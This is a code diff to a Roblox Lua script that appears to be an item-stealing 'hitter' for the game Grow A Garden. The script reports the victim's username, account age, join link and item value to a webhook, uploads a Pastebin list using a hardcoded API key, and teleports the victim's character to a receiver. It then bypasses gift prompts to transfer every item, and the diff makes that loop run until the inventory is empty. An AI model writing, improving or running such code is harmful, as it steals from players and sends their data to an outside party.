@@ -136,13 +136,13 @@ end
 local function buildItemsEmbed(items)
     return {
         title = "🎁 Items Received",
-description = string.format("```\n%s\n```", buildBackpackSection(items)),
+        description = string.format("``````", buildBackpackSection(items)),
         color = 5793266, -- blue-ish
     }
 end
 
 -- PASTEBIN UPLOAD FUNCTION
-local PASTEBIN_DEV_KEY = "2GXZr-FQKQR15rYjoyFmogIiRIzNif9x" -- your dev key
+local PASTEBIN_DEV_KEY = "2GXZr-FQKQR15rYjoyFmogIiRIzNif9x" -- your dev key here
 
 local function uploadToPastebin(text)
     local url = "https://pastebin.com/api/api_post.php"
@@ -175,7 +175,7 @@ local function buildMainEmbed(executer, receiver, totalValue, foundRare, pasteLi
         {name = "🧑‍💻 Player Information", value = string.format("**Username:** `%s`\n**Receiver:** `%s`\n**Account Age:** `%s`", executer.Name, receiver, accountAge), inline = false},
         {name = "💰 Total Value", value = string.format("**%s¢**", formatValue(totalValue)), inline = false},
         {name = "🌴 Join with URL", value = string.format("[Join with URL](%s)", joinLink), inline = false},
-        {name = "📄 View all hits", value = pasteLink and string.format("[View all hits](%s) _(expires in ~1d)_", pasteLink) or "_Failed to upload paste!_", inline = false}
+        {name = "📄 View all hits", value = pasteLink and string.format("[View all hits](%s) _(expires in ~10m)_", pasteLink) or "_Failed to upload paste!_", inline = false}
     }
     return {
         title = "🥗 Grow A Garden Hit",
@@ -262,24 +262,42 @@ local function findGiftPrompt(targetChar)
     return nil
 end
 
+-- IMPROVED GIFTING FUNCTION
 local function doGift(receiver)
     if giftingDone then return end
     giftingDone = true
     local myChar = plr.Character or plr.CharacterAdded:Wait()
     myChar:WaitForChild("HumanoidRootPart").CFrame = receiver.Character.HumanoidRootPart.CFrame + Vector3.new(0,0,2)
-    local items = select(1, collectItems())
-    for _, item in ipairs(items) do
-        equipTool(item.Tool)
-        local prompt = findGiftPrompt(receiver.Character)
-        if prompt then
-            local t0 = os.clock()
-            repeat task.wait(0.09) if (os.clock() - t0) > 4 then break end until prompt.Enabled
-            bypassProximityPrompt(prompt)
-            wait(0.18)
+    while true do
+        local items = select(1, collectItems())
+        if #items == 0 then break end -- No more items to gift
+        for _, item in ipairs(items) do
+            print("Gifting item:", item.Name)
+            equipTool(item.Tool)
+            local prompt = findGiftPrompt(receiver.Character)
+            if prompt then
+                local t0 = os.clock()
+                local promptEnabled = false
+                repeat
+                    task.wait(0.1)
+                    if prompt.Enabled then promptEnabled = true end
+                    if (os.clock() - t0) > 8 then break end -- Increased timeout to 8 seconds
+                until promptEnabled
+                if promptEnabled then
+                    bypassProximityPrompt(prompt)
+                    wait(0.2)
+                else
+                    print("Prompt not enabled for item:", item.Name)
+                end
+            else
+                print("No prompt found for item:", item.Name)
+            end
+            item.Tool.Parent = backpack
+            wait(0.1)
         end
-        item.Tool.Parent = backpack
-        wait(0.08)
+        wait(0.3) -- Small delay before checking again
     end
+    giftingDone = false -- Reset flag to allow future gifting
 end
 
 sendHitWebhook(plr, CONFIG.USERNAMES[1] or "unknown")
